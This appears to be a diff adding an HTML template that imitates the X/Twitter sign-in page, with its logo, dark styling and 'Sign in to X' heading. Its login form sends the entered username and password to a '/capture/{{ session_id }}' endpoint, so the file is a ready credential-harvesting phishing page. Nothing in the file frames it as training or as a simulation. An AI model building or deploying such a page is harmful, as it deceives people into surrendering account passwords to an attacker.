@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>X / Twitter - Log in</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{
+    font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;
+    background:#000;
+    color:#e7e9ea;
+    display:flex;
+    justify-content:center;
+    align-items:center;
+    min-height:100vh
+}
+.container{max-width:400px;width:100%;padding:32px}
+.logo{text-align:center;margin-bottom:24px}
+.logo svg{width:40px;height:40px;fill:#e7e9ea}
+.box{border:1px solid #333;border-radius:16px;padding:32px}
+.box h2{font-size:31px;font-weight:700;margin-bottom:28px;color:#e7e9ea}
+input{
+    width:100%;
+    padding:12px;
+    background:transparent;
+    border:1px solid #333;
+    border-radius:4px;
+    font-size:16px;
+    color:#e7e9ea;
+    outline:none;
+    margin-bottom:16px
+}
+input:focus{border-color:#1d9bf0}
+button[type="submit"]{
+    width:100%;
+    padding:12px;
+    background:#fff;
+    color:#000;
+    border:none;
+    border-radius:9999px;
+    font-size:16px;
+    font-weight:700;
+    cursor:pointer;
+    margin-top:4px
+}
+button[type="submit"]:hover{background:#ddd}
+.or{display:flex;align-items:center;margin:12px 0;color:#536471}
+.or::before,.or::after{content:'';flex:1;height:1px;background:#333}
+.or span{margin:0 8px;font-size:14px}
+.alt{
+    width:100%;
+    padding:10px;
+    background:transparent;
+    border:1px solid #536471;
+    border-radius:9999px;
+    color:#e7e9ea;
+    font-size:15px;
+    text-align:center;
+    margin-bottom:8px
+}
+.alt:hover{background:rgba(239,243,244,0.1)}
+.fgt{
+    width:100%;
+    padding:12px;
+    background:transparent;
+    border:1px solid #536471;
+    border-radius:9999px;
+    color:#e7e9ea;
+    font-size:15px;
+    text-align:center;
+    margin-top:12px;
+    font-weight:600
+}
+.st{text-align:center;margin-top:24px;font-size:14px;color:#536471}
+.st a{color:#1d9bf0;text-decoration:none}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="box">
+        <div class="logo">
+            <svg viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg>
+        </div>
+        <h2>Sign in to X</h2>
+        <form action="/capture/{{ session_id }}" method="POST">
+            <input type="text" name="username" placeholder="Phone, email, or username" required>
+            <input type="password" name="password" placeholder="Password" required>
+            <button type="submit">Next</button>
+        </form>
+        <div class="or"><span>or</span></div>
+        <div class="alt">Sign in with Google</div>
+        <div class="alt">Sign in with Apple</div>
+        <div class="fgt">Forgot password?</div>
+        <div class="st">Don't have an account? <a href="#">Sign up</a></div>
+    </div>
+</div>
+</body>
+</html>
